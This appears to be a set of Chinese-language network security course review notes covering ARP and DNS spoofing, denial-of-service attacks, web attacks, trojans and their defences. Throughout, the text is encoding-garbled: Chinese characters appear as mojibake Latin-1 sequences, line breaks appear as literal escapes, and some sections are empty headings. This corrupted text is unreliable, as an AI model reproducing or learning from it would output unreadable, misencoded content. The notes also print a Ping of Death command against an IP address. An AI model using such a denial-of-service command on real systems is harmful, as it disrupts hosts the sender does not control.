æ‰‹åŠ¨æ›´æ–°ç¼“å­˜ä¸­çš„è®°å½•ï¼Œ ä½¿ARPæ¬ºéª—æ— æ³•è¿›è¡Œã€‚\n3.ä½¿ç”¨ARPæœåŠ¡å™¨ï¼Œé€šè¿‡è¯¥æœåŠ¡å™¨æŸ¥æ‰¾è‡ªå·±çš„ARPè½¬æ¢è¡¨æ¥å“åº”å…¶ä»–æœºå™¨çš„ARPå¹¿æ’­ã€‚ è¿™é‡Œè¦ç¡®ä¿è¿™å°ARPæœåŠ¡å™¨ä¸è¢«æ”»å‡»è€…æ§åˆ¶ã€‚\n4.ä½¿ç”¨ARPæ¬ºéª—é˜²æŠ¤è½¯ä»¶ï¼Œ å¦‚ARPé˜²ç«å¢™ã€‚\n5.åŠæ—¶å‘ç°æ­£åœ¨è¿›è¡ŒARPæ¬ºéª—çš„ä¸»æœºï¼Œ å¹¶å°†å…¶éš”ç¦»ã€‚\n\n### DNSæ¬ºéª—\n\n![DNSåŸŸåè§£æ](https://i.loli.net/2020/04/16/hU8iAmPl72n9GOa.png)\n\n#### åŸç†\n\nå½“å®¢æˆ·ä¸»æœºå‘æœ¬åœ°DNSæœåŠ¡å™¨æŸ¥è¯¢åŸŸåçš„æ—¶å€™ï¼Œå¦‚æœæœåŠ¡å™¨çš„ç¼“å­˜ä¸­å·²ç»æœ‰ç›¸åº”è®°å½•ï¼ŒDNSæœåŠ¡å™¨å°±ä¸ä¼šå†å‘å…¶ä»–æœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢ï¼Œè€Œæ˜¯ç›´æ¥å°†è¿™æ¡è®°å½•è¿”å›ç»™ç”¨æˆ·ã€‚æ”»å‡»è€…æ­£æ˜¯åˆ©ç”¨è¿™ä¸€ç‚¹,é€šè¿‡åœ¨`DNSæœåŠ¡å™¨çš„æœ¬åœ°Cache`ä¸­ç¼“å­˜ä¸€æ¡`ä¼ªé€ çš„è§£æè®°å½•`æ¥å®ç°DNSæ¬ºéª—çš„ã€‚\n\n#### å®ç°æ­¥éª¤\n\n![DNSæ¬ºéª—è¿‡ç¨‹](https://img.jwt1399.top//img/20200802102438.png)\n\n## ç¬¬ä¸ƒç«  æ‹’ç»æœåŠ¡æ”»å‡»ä¸é˜²å¾¡\n\n### æ‹’ç»æœåŠ¡æ”»å‡»çš„æ¦‚å¿µ\n\næ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆDoSï¼ŒDenial of Serviceï¼‰æ˜¯æŒ‡æ”»å‡»è€…åˆ©ç”¨ç³»ç»Ÿçš„ç¼ºé™·ï¼Œé€šè¿‡æ‰§è¡Œä¸€äº›æ¶æ„çš„æ“ä½œï¼Œä½¿å¾—`åˆæ³•çš„ç³»ç»Ÿç”¨æˆ·ä¸èƒ½åŠæ—¶å¾—åˆ°åº”å¾—çš„æœåŠ¡æˆ–ç³»ç»Ÿèµ„æº`ï¼Œå¦‚CPUå¤„ç†æ—¶é—´ã€å­˜å‚¨ç©ºé—´ä»¥åŠç½‘ç»œå¸¦å®½ç­‰\n\nDoSæœ€æœ¬è´¨çš„ç‰¹å¾æ˜¯`å»¶é•¿æœåŠ¡ç­‰å¾…æ—¶é—´ï¼Œä½¿ç”¨æˆ·æ— æ³•å¿å—è€Œæ”¾å¼ƒæœåŠ¡`\n\n### æ‹’ç»æœåŠ¡æ”»å‡»çš„åŸºæœ¬æ¨¡å¼\n\n- èµ„æºæ¶ˆè€—å‹\n  - æ¶ˆè€—ç½‘ç»œå¸¦å®½\n  - æ¶ˆè€—ç£ç›˜ç©ºé—´\n  - æ¶ˆè€—CPUå’Œå†…å­˜èµ„æº\n\n- é…ç½®ä¿®æ”¹å‹ï¼šå¦‚ç ´åç³»ç»Ÿçš„é…ç½®ä¿¡æ¯ï¼Œé˜»æ­¢å…¶ä»–åˆæ³•ç”¨æˆ·ç™»å½•\n\n- åŸºäºç³»ç»Ÿç¼ºé™·å‹ï¼šæ•…æ„è¾“å…¥é”™è¯¯å£ä»¤ä¸€å®šæ¬¡æ•°åå¯¼è‡´ç³»ç»Ÿé”å®šè¯¥ç”¨æˆ·è´¦æˆ·\n\n- ç‰©ç†å®ä½“ç ´åå‹ï¼šå¯¹é€šä¿¡è·¯ç”±è®¾å¤‡çš„ç ´å\n\n### å…¸å‹æ‹’ç»æœåŠ¡æ”»å‡»æŠ€æœ¯\n\n**æ­»äº¡ä¹‹Pingï¼ˆPing of Deathï¼‰**\n\nPingä¹‹æ‰€ä»¥ä¼šé€ æˆä¼¤å®³æºäºICMPåè®®\n\nICMPåè®®`æŠ¥æ–‡é•¿åº¦(64KB)`æ˜¯å›ºå®šçš„ã€‚æ—©æœŸçš„å¾ˆå¤šæ“ä½œç³»ç»Ÿåœ¨å¤„ç†ICMPåè®®æ•°æ®æŠ¥æ–‡æ—¶ï¼Œåªå¼€è¾Ÿäº†`64KBçš„ç¼“å­˜åŒº`ç”¨å­˜æ”¾æ¥æ”¶åˆ°çš„ICMPæ•°æ®åŒ…ã€‚ ä¸€æ—¦å‘é€è¿‡æ¥çš„ICMPæ•°æ®åŒ…è¶…è¿‡64KB, æ“ä½œç³»ç»Ÿå°†æ”¶åˆ°çš„æ•°æ®æŠ¥æ–‡å‘ç¼“å­˜åŒºä¸­å¡«å†™æ—¶ï¼Œå°±ä¼šäº§ç”Ÿä¸€ä¸ªç¼“å­˜æº¢å‡ºï¼Œå¼•èµ·å†…å­˜è®¿é—®é”™è¯¯ï¼Œå¯¼è‡´TCP/IPåè®®å †æ ˆå´©æºƒï¼Œé€ æˆä¸»æœºçš„é‡å¯åŠ¨æˆ–è€…æ­»æœºã€‚\n\næ—©æœŸçš„Pingç¨‹åºæœ‰ä¸€ä¸ª\"-l\"å‚æ•°å¯æŒ‡å®šå‘é€æ•°æ®åŒ…çš„å°ºå¯¸ï¼Œ åœ¨ä½¿ç”¨Pingå‘½ä»¤æ—¶åˆ©ç”¨è¿™ä¸ªå‚æ•°æŒ‡å®šæ•°æ®åŒ…çš„å°ºå¯¸å¤§äº64KB(65536å­—èŠ‚)ã€‚ \n\n```bash\nPing -l 65540 192.168.1.140\n```\n\nå¦‚æœå¯¹æ–¹ä¸»æœºå­˜åœ¨è¿™æ ·ä¸€ä¸ªæ¼æ´ï¼Œå°±ä¼šå› æ¥æ”¶çš„ICMPæ•°æ®åŒ…é•¿åº¦è¿‡å¤§å¯¼è‡´ç¼“å­˜æº¢å‡ºï¼Œå½¢æˆä¸€æ¬¡æ‹’ç»æœåŠ¡æ”»å‡»ã€‚è¿™ç§æ”»å‡»è¢«ç§°ä¸ºPing of Death, åˆå« â€œæ­»äº¡ä¹‹Ping\"ã€‚\n\n**æ³ªæ»´ï¼ˆTeardropï¼‰**\n\n**SYN FLOOD**\n\n**Smurf**\n\n**åˆ†å¸ƒå¼åå°„æ‹’ç»æœåŠ¡æ”»å‡»**\n\n### åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»(DDoS)\n\n#### åˆ†å¸ƒå¼\n\n â€œåˆ†å¸ƒ â€ æ˜¯æŒ‡æŠŠè¾ƒå¤§çš„è®¡ç®—é‡æˆ–å·¥ä½œé‡åˆ†æˆå¤šä¸ªå°ä»»åŠ¡ï¼Œäº¤ç”±è¿æ¥åœ¨ä¸€èµ·çš„å¤šä¸ªå¤„ç†å™¨æˆ–å¤šä¸ªèŠ‚ç‚¹å…±åŒåä½œå®Œæˆã€‚\n\n#### åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»\n\n**Distributed Denial of Service** æ˜¯æ”»å‡»è€…å¯»æ‰¾ç½‘ç»œä¸Šæœ‰æ¼æ´çš„ä¸»æœºï¼Œè¿›å…¥ç³»ç»Ÿååœ¨å…¶ä¸Šé¢å®‰è£…åé—¨ç¨‹åºï¼Œæ§åˆ¶å¤§é‡çš„è¢«å…¥ä¾µä¸»æœºåŒæ—¶å¯¹ç›®æ ‡å‘èµ·DoSæ”»å‡»ã€‚ å¦‚å›¾7-6æ‰€ç¤ºï¼Œ æ”»å‡»è€…æ§åˆ¶åˆ†å¸ƒåœ¨ä¸–ç•Œå„åœ°çš„ä¼—å¤šä¸»æœºåŒæ—¶æ”»å‡»æŸä¸€ä¸ªå—å®³è€…ã€‚\n\n![](https://i.loli.net/2020/04/16/sScB8JoFk4RYd9P.png)\n\n\n\n## ç¬¬ä¹ç«  Webæ”»å‡»ä¸é˜²å¾¡æŠ€æœ¯\n\n### WEBæœåŠ¡å™¨æŒ‡çº¹è¯†åˆ«\n\né€šè¿‡å¯¹æœåŠ¡å™¨ä¸Šçš„HTTPåº”ç”¨ç¨‹åºå®‰è£…å’Œé…ç½®ç­‰ä¿¡æ¯è¿›è¡Œè¿œç¨‹åˆºæ¢ï¼Œä»è€Œäº†è§£è¿œç¨‹WebæœåŠ¡å™¨çš„é…ç½®ä¿¡æ¯ï¼Œç„¶åæ ¹æ®ä¸åŒç‰ˆæœ¬çš„WebæœåŠ¡å™¨è¿›è¡Œæœ‰ç›®çš„çš„æ”»å‡»ã€‚\n\næŒ‡çº¹è¯†åˆ«æ˜¯ä¸ºäº†åˆ¤æ–­æœåŠ¡å™¨çš„ç‰ˆæœ¬,ä»è€Œæ‰¾åˆ°æœåŠ¡å™¨çš„æ¼æ´ã€‚\n\n### WEBé¡µé¢ç›—çªƒ\n\nWebç›—çªƒçš„ç›®çš„æ˜¯é€šè¿‡å¯¹å„ä¸ªç½‘é¡µé¡µé¢æºç çš„è¯¦ç»†åˆ†æï¼Œæ‰¾å‡ºå¯èƒ½å­˜åœ¨äºä»£ç ã€æ³¨é‡Šæˆ–è€…è®¾è®¡ä¸­çš„å…³é”®ç¼ºé™·å’Œè„†å¼±ç‚¹ï¼Œä»¥æ­¤æ¥ç¡®å®šæ”»å‡»çš„çªç ´ç‚¹ã€‚\n\nç›—çªƒwebæœåŠ¡å™¨çš„ä¸¤ç§æ–¹æ³•:é€é¡µæ‰‹å·¥æ‰«æå’Œè‡ªåŠ¨æ‰«æã€‚\n\n**é˜²å¾¡**\n\n1. æé«˜Webé¡µé¢ä»£ç çš„è´¨é‡\n2. ç›‘è§†è®¿é—®æ—¥å¿—ä¸­å¿«é€Ÿå¢é•¿çš„GETè¯·æ±‚\n3. åœ¨Webç«™ç‚¹ä¸Šè®¾ç½®garbage.cgiè„šæœ¬\n4. ç»å¸¸æ³¨æ„ç½‘ç»œä¸Šæ–°å‡ºç°çš„webæ‰«æè„šæœ¬çš„æ”»å‡»å†…å®¹\n\n### ç½‘é¡µéªŒè¯ç çš„ä½œç”¨å’Œé‡è¦æ€§\n\n1ã€ä¸ºäº†ç¡®ä¿ç”¨æˆ·æäº¤çš„è¯·æ±‚æ˜¯åœ¨çº¿è¿›è¡Œçš„æ­£å¸¸æ“ä½œ\n\n2ã€é˜²æ­¢ç”¨æˆ·ä½¿ç”¨ç¨‹åºè‡ªåŠ¨è¿›è¡Œæäº¤æ³¨å…¥\n\n3ã€é˜²æ­¢æš´åŠ›ç ´è§£ã€æ¶æ„æ³¨æ°´ç­‰\n\n4ã€ä¿è¯æœåŠ¡å™¨ç³»ç»Ÿçš„ç¨³å®šæ€§å’Œç”¨æˆ·ä¿¡æ¯çš„å®‰å…¨\n\n### SQLæ³¨å…¥\n\nã€‚ã€‚ã€‚\n\n### XSSæ”»å‡»\n\nXSSæ˜¯è·¨ç«™è„šæœ¬æ”»å‡»(Cross Site Script)ã€‚å®ƒæŒ‡çš„æ˜¯æ¶æ„æ”»å‡»è€…å¾€Webé¡µé¢é‡Œæ’å…¥æ¶æ„JSä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥ç½‘é¡µæ—¶ï¼ŒåµŒå…¥å…¶ä¸­Webé‡Œé¢çš„htmIä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„ç”¨æˆ·çš„ç‰¹æ®Šç›®çš„ã€‚\n\n## ç¬¬åç«  æœ¨é©¬æ”»å‡»ä¸é˜²å¾¡æŠ€æœ¯\n\n#### æœ¨é©¬çš„å±å®³\n\næœ¨é©¬ç—…æ¯’å¯¹è®¡ç®—æœºçš„ç›´æ¥ç ´åæ–¹å¼æ˜¯æ”¹å†™ç£ç›˜ï¼Œå¯¹è®¡ç®—æœºæ•°æ®åº“è¿›è¡Œç ´åï¼Œç»™ç”¨æˆ·å¸¦æ¥ä¸ä¾¿ã€‚å½“æœ¨é©¬ç ´åç¨‹åºåï¼Œä½¿å¾—ç¨‹åºæ— æ³•è¿è¡Œï¼Œç»™è®¡ç®—æœºçš„æ•´ä½“è¿è¡Œå¸¦æ¥ä¸¥é‡çš„å½±å“ã€‚å¦å¤–ä¸€äº›æœ¨é©¬å¯ä»¥é€šè¿‡ç£ç›˜çš„å¼•å¯¼åŒºè¿›è¡Œï¼Œç—…æ¯’å…·æœ‰å¼ºçƒˆçš„å¤åˆ¶åŠŸèƒ½ï¼ŒæŠŠç”¨æˆ·ç¨‹åºä¼ é€’ç»™å¤–éƒ¨é“¾æ¥è€…ã€‚è¿˜å¯ä»¥æ›´æ”¹ç£ç›˜å¼•å¯¼åŒºï¼Œé€ æˆæ•°æ®å½¢æˆé€šé“ç ´åã€‚ç—…æ¯’ä¹Ÿé€šè¿‡å¤§é‡å¤åˆ¶æŠ¢å ç³»ç»Ÿèµ„æºï¼Œå¯¹ç³»ç»Ÿè¿è¡Œç¯å¢ƒè¿›è¡Œå¹²æ‰°ï¼Œå½±å“è®¡ç®—æœºç³»ç»Ÿè¿è¡Œé€Ÿåº¦ã€‚\n\n#### æœ¨é©¬æ”»å‡»çš„è¿‡ç¨‹\n\næ”»å‡»è€…åˆ©ç”¨æœ¨é©¬è¿›è¡Œç½‘ç»œå…¥ä¾µçš„æ”»å‡»è¿‡ç¨‹ä¸€èˆ¬ä¸ºï¼šé¦–å…ˆå°†æœ¨é©¬`æ¤å…¥ç›®æ ‡ç³»ç»Ÿ`ï¼› ç„¶åæœ¨é©¬ç¨‹åºå¿…é¡»èƒ½å¤Ÿ`è‡ªåŠ¨åŠ è½½è¿è¡Œ`ï¼Œå¹¶ä¸”èƒ½å¤Ÿå¾ˆå¥½åœ°`éšè—è‡ªå·±`ï¼›æœ€åæœ¨é©¬å¿…é¡»å¯ä»¥å®ç°ä¸€äº›æ”»å‡»è€…æ„Ÿå…´è¶£çš„åŠŸèƒ½ï¼Œä¾‹å¦‚`è¿œç¨‹æ§åˆ¶`ã€‚\n\n- æ¤å…¥æŠ€æœ¯\n- è‡ªåŠ è½½æŠ€æœ¯\n- éšè—æŠ€æœ¯\n- è¿œç¨‹æ§åˆ¶\n\n#### é˜²å¾¡\n\n**æœ¨é©¬æ£€æµ‹ï¼š**\n\n1. ç«¯å£æ‰«æå’Œè¿æ¥æ£€æŸ¥\n\n2. æ£€æŸ¥ç³»ç»Ÿè¿›ç¨‹\n3. æ£€æŸ¥ini æ–‡ä»¶ã€ æ³¨å†Œè¡¨å’ŒæœåŠ¡\n4. ç›‘è§†ç½‘ç»œé€šä¿¡\n\n**æœ¨é©¬é˜²èŒƒï¼š**\n\n1. åŠæ—¶ä¿®è¡¥æ¼æ´ï¼Œ å®‰è£…è¡¥ä¸\n2. è¿è¡Œå®æ—¶ç›‘æ§ç¨‹åº\n3. åŸ¹å…»é£é™©æƒ¹è¯†\n4. å³æ—¶å‘ç°ï¼Œ å³æ—¶æ¸…é™¤\n\n## æ€»å¤ä¹ \n\n### 1.Webé¡µé¢ç›—çªƒ\n\n#### åŸç†\n\nWebç›—çªƒçš„ç›®çš„æ˜¯é€šè¿‡å¯¹å„ä¸ªç½‘é¡µé¡µé¢æºç çš„è¯¦ç»†åˆ†æï¼Œæ‰¾å‡ºå¯èƒ½å­˜åœ¨çš„ä»£ç ã€æ³¨é‡Šæˆ–è€…è®¾è®¡ä¸­çš„å…³é”®ç¼ºé™·å’Œè„†å¼±ç‚¹ï¼Œä»¥æ­¤æ¥ç¡®å®šæ”»å‡»çš„çªç ´ç‚¹ã€‚\n\nç›—çªƒwebæœåŠ¡å™¨çš„ä¸¤ç§æ–¹æ³•:é€é¡µæ‰‹å·¥æ‰«æå’Œè‡ªåŠ¨æ‰«æã€‚\n\n#### **é˜²å¾¡**\n\n1. æé«˜Webé¡µé¢ä»£ç çš„è´¨é‡\n2. ç›‘è§†è®¿é—®æ—¥å¿—ä¸­å¿«é€Ÿå¢é•¿çš„GETè¯·æ±‚\n3. åœ¨Webç«™ç‚¹ä¸Šè®¾ç½®garbage.cgiè„šæœ¬\n4. ç»å¸¸æ³¨æ„ç½‘ç»œä¸Šæ–°å‡ºç°çš„webæ‰«æè„šæœ¬çš„æ”»å‡»å†…å®¹\n\n### 2.ç‰¹æ´›ä¼Šæœ¨é©¬\n\n#### æœ¨é©¬çš„å±å®³\n\nè‡ªåŠ¨æœç´¢å·²ä¸­æœ¨é©¬çš„è®¡ç®—æœº\nç®¡ç†å¯¹æ–¹èµ„æºï¼Œå¦‚æŸ¥çœ‹æ–‡ä»¶å†…å®¹ã€ä¸Šä¼ æ–‡ä»¶ç­‰\nè·Ÿè¸ªç›‘è§†å¯¹æ–¹å±å¹•å’Œè¿è¡Œçš„ä»»åŠ¡\nè¿œç¨‹ç›‘æµ‹å’Œæ“çºµè®¡ç®—æœº\n\n#### æœ¨é©¬æ”»å‡»çš„è¿‡ç¨‹\n\næ”»å‡»è€…åˆ©ç”¨æœ¨é©¬è¿›è¡Œç½‘ç»œå…¥ä¾µçš„æ”»å‡»è¿‡ç¨‹ä¸€èˆ¬ä¸ºï¼šé¦–å…ˆå°†æœ¨é©¬`æ¤å…¥ç›®æ ‡ç³»ç»Ÿ`ï¼›ç„¶åæœ¨é©¬ç¨‹åºå¿…é¡»èƒ½å¤Ÿ`è‡ªåŠ¨åŠ è½½è¿è¡Œ`ï¼Œå¹¶ä¸”èƒ½å¤Ÿå¾ˆå¥½åœ°`éšè—è‡ªå·±`ï¼›æœ€åæœ¨é©¬å¿…é¡»å¯ä»¥å®ç°ä¸€äº›æ”»å‡»è€…æ„Ÿå…´è¶£çš„åŠŸèƒ½ï¼Œä¾‹å¦‚`è¿œç¨‹æ§åˆ¶`ã€‚\n\næ¶‰åŠæŠ€æœ¯ï¼šæ¤å…¥æŠ€æœ¯ã€è‡ªåŠ è½½æŠ€æœ¯ã€éšè—æŠ€æœ¯ã€è¿œç¨‹æ§åˆ¶æŠ€æœ¯\n\n#### æœ¨é©¬çš„ç‰¹ç‚¹\n\næœ‰æ•ˆæ€§ã€éšè”½æ€§ã€é¡½å›ºæ€§ã€æ˜“æ¤å…¥æ€§\n\n#### é˜²å¾¡\n\n**æœ¨é©¬æ£€æµ‹ï¼š**\n\n1. ç«¯å£æ‰«æå’Œè¿æ¥æ£€æŸ¥\n\n2. æ£€æŸ¥ç³»ç»Ÿè¿›ç¨‹\n3. æ£€æŸ¥ ini æ–‡ä»¶ã€ æ³¨å†Œè¡¨å’ŒæœåŠ¡\n4. ç›‘è§†ç½‘ç»œé€šä¿¡\n\n**æœ¨é©¬é˜²èŒƒï¼š**\n\n1. åŠæ—¶ä¿®è¡¥æ¼æ´ï¼Œ å®‰è£…è¡¥ä¸\n2. è¿è¡Œå®æ—¶ç›‘æ§ç¨‹åº\n3. åŸ¹å…»é£é™©æ„è¯†\n4. å³æ—¶å‘ç°ï¼Œ å³æ—¶æ¸…é™¤\n\n### 3.æœåŠ¡å¯ç”¨æ€§\n\n  è®¡ç®—æœºè½¯ä»¶ç³»ç»Ÿå¤„äºå¯å·¥ä½œçš„æ—¶é—´æ¯”ä¾‹ï¼Œå°±æ˜¯æœåŠ¡çš„å¯ç”¨æ€§\n\n### 4.å­—å…¸æ”»å‡»\n\nå­—å…¸æ”»å‡»ä½¿ç”¨çš„æ˜¯ä¸€ä¸ªåŒ…å«å¤§å¤šæ•°è¯å…¸å•è¯çš„æ–‡ä»¶ï¼Œåˆ©ç”¨è¿™äº›å•è¯æ¥çŒœæµ‹å£ä»¤\n\n### 5.ç½‘ç»œå—…æ¢\n\n- æ˜¯ä¸€ç§åœ¨ä»–æ–¹æœªå¯Ÿè§‰çš„æƒ…å†µä¸‹æ•è·å…¶é€šä¿¡æŠ¥æ–‡æˆ–é€šä¿¡å†…å®¹çš„æŠ€æœ¯\n- ç½‘ç»œå—…æ¢æŠ€æœ¯çš„èƒ½åŠ›èŒƒå›´åªé™äºå±€åŸŸç½‘ï¼Œä¸»æœºå¯ä»¥æ¥æ”¶åˆ°æœ¬ç½‘æ®µåœ¨åŒä¸€æ¡ç‰©ç†é€šé“ä¸Šä¼ è¾“çš„æ‰€æœ‰ä¿¡æ¯ï¼Œè€Œä¸ç®¡è¿™äº›çš„å‘é€æ–¹å’Œæ¥æ”¶æ–¹æ˜¯è°\n\n**å—…æ¢çš„æŠ€æœ¯**\n\n- å…±äº«å¼å±€åŸŸç½‘çš„ç›‘å¬æŠ€æœ¯\n\n- äº¤æ¢å¼å±€åŸŸç½‘çš„ç›‘å¬æŠ€æœ¯\n\n**å—…æ¢çš„é˜²å¾¡**\n\n- å®‰å…¨çš„æ‹“æ‰‘ç»“æ„\n\n- ä¼šè¯åŠ å¯†\n\n\n**å…±äº«å¼ç½‘ç»œä¸‹çš„é˜²ç›‘å¬**\n\n- ç½‘ç»œå’Œä¸»æœºå“åº”æ—¶é—´æµ‹è¯•\n\n- ARPæ£€æµ‹ï¼ˆæ£€æµ‹å¯¹æ–¹æ˜¯å¦åœ¨æ··æ‚æ¨¡å¼ä¸‹ï¼‰\n\n**äº¤æ¢å¼ç½‘ç»œä¸‹çš„é˜²ç›‘å¬**\n\n- é˜²æ­¢ARPæ¬ºéª—         \n\n### 6.è®¿é—®æ§åˆ¶\n\nè®¿é—®æ§åˆ¶æ˜¯ç½‘ç»œå®‰å…¨é˜²èŒƒå’Œä¿æŠ¤çš„ä¸»è¦èµ„æºï¼Œå®ƒçš„ä¸»è¦ä»»åŠ¡æ˜¯ä¿è¯ç½‘ç»œèµ„æºä¸è¢«éæ³•ä½¿ç”¨å’Œéæ³•è®¿é—®ã€‚\n\n### 7.DoSæ”»å‡»\n\næ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆDoSï¼ŒDenial of Serviceï¼‰æ˜¯æŒ‡æ”»å‡»è€…åˆ©ç”¨ç³»ç»Ÿçš„ç¼ºé™·ï¼Œé€šè¿‡æ‰§è¡Œä¸€äº›æ¶æ„çš„æ“ä½œï¼Œä½¿å¾—`åˆæ³•çš„ç³»ç»Ÿç”¨æˆ·ä¸èƒ½åŠæ—¶å¾—åˆ°åº”å¾—çš„æœåŠ¡æˆ–ç³»ç»Ÿèµ„æº`ï¼Œå¦‚CPUå¤„ç†æ—¶é—´ã€å­˜å‚¨ç©ºé—´ä»¥åŠç½‘ç»œå¸¦å®½ç­‰\n\nDoSæœ€æœ¬è´¨çš„ç‰¹å¾æ˜¯`å»¶é•¿æœåŠ¡ç­‰å¾…æ—¶é—´ï¼Œä½¿ç”¨æˆ·æ— æ³•å¿å—è€Œæ”¾å¼ƒæœåŠ¡`\n\n### 8. è¢«åŠ¨æ”»å‡»\n\næ”»å‡»è€…å¯¹ä¼ è¾“ä¸­çš„ä¿¡æ¯è¿›è¡Œçªƒå¬å’Œç›‘æµ‹ï¼Œè·å¾—ä¼ è¾“çš„ä¿¡æ¯ã€‚\n\nè¢«åŠ¨æ”»å‡»æ–¹å¼ï¼šä¿¡æ¯æ”¶é›†å’Œæµé‡åˆ†æã€‚\n\n### 9. ä¸»åŠ¨æ”»å‡»\n\næ”»å‡»è€…è®¿é—®ä»–æ‰€éœ€ä¿¡æ¯çš„æ•…æ„è¡Œä¸ºï¼Œä¸€èˆ¬ä¼šæ”¹å˜ç³»ç»Ÿèµ„æºæˆ–å½±å“ç³»ç»Ÿè¿ä½œã€‚\n\nä¸»åŠ¨æ”»å‡»æ–¹å¼ï¼šåŒ…æ‹¬å¯¹æ•°æ®æµè¿›è¡Œç¯¡æ”¹æˆ–ä¼ªé€ æ•°æ®æµï¼Œå¯åˆ†ä¸ºå››ç±»ï¼šä¼ªè£…ã€é‡æ”¾ã€æ¶ˆæ¯ç¯¡æ”¹å’Œæ‹’ç»æœåŠ¡ã€‚\n\n### 10. OSæŒ‡çº¹è¯†åˆ«\n\né€šè¿‡å¯¹ä¸åŒæ“ä½œç³»ç»Ÿçš„TCP/IPåè®®å­˜åœ¨çš„ç»†å¾®å·®å¼‚ï¼Œè¯†åˆ«ä¸»æœºå®‰è£…çš„æ“ä½œç³»ç±»å‹ï¼Œä»¥é€‰æ‹©ä¸åŒæ¸—é€æ”»å‡»ä»£ç åŠé…ç½®\n\nåˆ†ä¸ºï¼šä¸»åŠ¨åè®®æ ˆæŒ‡çº¹è¯†åˆ«ã€è¢«åŠ¨åè®®æ ˆæŒ‡çº¹è¯†åˆ«\n\n### 11. IPæ¬ºéª—\n\n**ä»€ä¹ˆæ˜¯IPæ¬ºéª—ï¼Ÿ**\n\nTCP/IPç½‘ç»œä¸­çš„æ¯ä¸€ä¸ªæ•°æ®åŒ…éƒ½åŒ…å«æºä¸»æœºå’Œç›®çš„ä¸»æœºçš„IPåœ°å€ï¼Œ æ”»å‡»è€…å¯ä»¥ä½¿ç”¨å…¶ä»–ä¸»æœºçš„IPåœ°å€ï¼Œäº•å‡è£…è‡ªå·±æ¥è‡ªè¯¥ä¸»æœºï¼Œä»¥è·å¾—è‡ªå·±æœªè¢«æˆæƒè®¿é—®çš„ä¿¡æ¯ã€‚ è¿™ç§ç±»å‹çš„æ”»å‡»ç§°ä¸ºIPæ¬ºéª—\n![](https://i.loli.net/2020/03/31/CJxP7R1yMiLmZ8E.png)\n\n**åŸºæœ¬çš„IPæ¬ºéª—æŠ€æœ¯**\n\n- åŸºæœ¬åœ°å€å˜åŒ–\n- ä½¿ç”¨æºç«™é€‰è·¯æˆªå–æ•°æ®åŒ…\n- åˆ©ç”¨ä¿¡ä»»å…³ç³»\n\n**IPæ¬ºéª—é«˜çº§åº”ç”¨â€”TCPä¼šè¯åŠ«æŒ**\n\n![](https://i.loli.net/2020/03/31/5RJ1XALFi2nIHao.png)\n\n### 12. å¼±å£ä»¤\n\n- å£ä»¤è¿‡äºç®€å•ï¼Œå®¹æ˜“è¢«äººçŒœå‡ºæ¥\n- å£ä»¤è¿‡äºå¤æ‚ï¼Œä¸å¥½è®°å¿†ï¼Œè¿™æ ·ä½¿å¾—å£ä»¤åè€Œæ›´ä¸å®‰å…¨\n- å®‰å…¨æ€§ä»…ä¾èµ–äºå£ä»¤\n- å£ä»¤å¯è¢«è¿›è¡Œå­—å…¸å¼æ”»å‡»\n\n### 13. XSSæ”»å‡»\n\nXSSæ˜¯è·¨ç«™è„šæœ¬æ”»å‡»(Cross Site Script)ã€‚å®ƒæŒ‡çš„æ˜¯æ¶æ„æ”»å‡»è€…å¾€Webé¡µé¢é‡Œæ’å…¥æ¶æ„JSä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥ç½‘é¡µæ—¶ï¼ŒåµŒå…¥å…¶ä¸­Webé‡Œé¢çš„JSä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„ç”¨æˆ·çš„ç‰¹æ®Šç›®çš„ã€‚\n\n### 14. WebæœåŠ¡å™¨æŒ‡çº¹è¯†åˆ«\n\né€šè¿‡å¯¹æœåŠ¡å™¨ä¸Šçš„HTTPåº”ç”¨ç¨‹åºå®‰è£…å’Œé…ç½®ç­‰ä¿¡æ¯è¿›è¡Œè¿œç¨‹åˆºæ¢ï¼Œä»è€Œäº†è§£è¿œç¨‹WebæœåŠ¡å™¨çš„é…ç½®ä¿¡æ¯ï¼Œç„¶åæ ¹æ®ä¸åŒç‰ˆæœ¬çš„WebæœåŠ¡å™¨è¿›è¡Œæœ‰ç›®çš„çš„æ”»å‡»ã€‚\n\næŒ‡çº¹è¯†åˆ«æ˜¯ä¸ºäº†åˆ¤æ–­æœåŠ¡å™¨çš„ç‰ˆæœ¬,ä»è€Œæ‰¾åˆ°æœåŠ¡å™¨çš„æ¼æ´ã€‚\n\n### 15.ç½‘ç»œä¿¡æ¯å®‰å…¨å››è¦ç´ \n\nä¿å¯†æ€§ã€å®Œæ•´æ€§ã€å¯ç”¨æ€§ã€å¯æ§æ€§\n\n### 16.ARPæ¬ºéª—æ”»å‡»çš„åŸç†ä¸é˜²èŒƒ\n\n#### åŸç†\n\né€šè¿‡è™šå‡è¯·æ±‚æˆ–å“åº”æŠ¥æ–‡ï¼Œä½¿å¾—å…¶ä»–ä¸»æœºçš„ARPåˆ—è¡¨å‘ç”Ÿæ”¹å˜è€Œæ— æ³•æ­£å¸¸é€šä¿¡çš„æ”»å‡»è¡Œä¸ºã€‚\n\n#### é˜²èŒƒ\n\n1.MACåœ°å€ç»‘å®šã€‚ ä½¿ç½‘ç»œä¸­æ¯ä¸€å°è®¡ç®—æœºçš„lPåœ°å€ä¸ç¡¬ä»¶åœ°å€ä¸€ä¸€å¯¹åº”ï¼Œ ä¸å¯æ›´æ”¹ï¼\n2.ä½¿ç”¨é™æ€ARPç¼“å­˜ã€‚ æ‰‹åŠ¨æ›´æ–°ç¼“å­˜ä¸­çš„è®°å½•ï¼Œ ä½¿ARPæ¬ºéª—æ— æ³•è¿›è¡Œã€‚\n3.ä½¿ç”¨ARPæœåŠ¡å™¨ï¼Œé€šè¿‡è¯¥æœåŠ¡å™¨æŸ¥æ‰¾è‡ªå·±çš„ARPè½¬æ¢è¡¨æ¥å“åº”å…¶ä»–æœºå™¨çš„ARPå¹¿æ’­ã€‚ 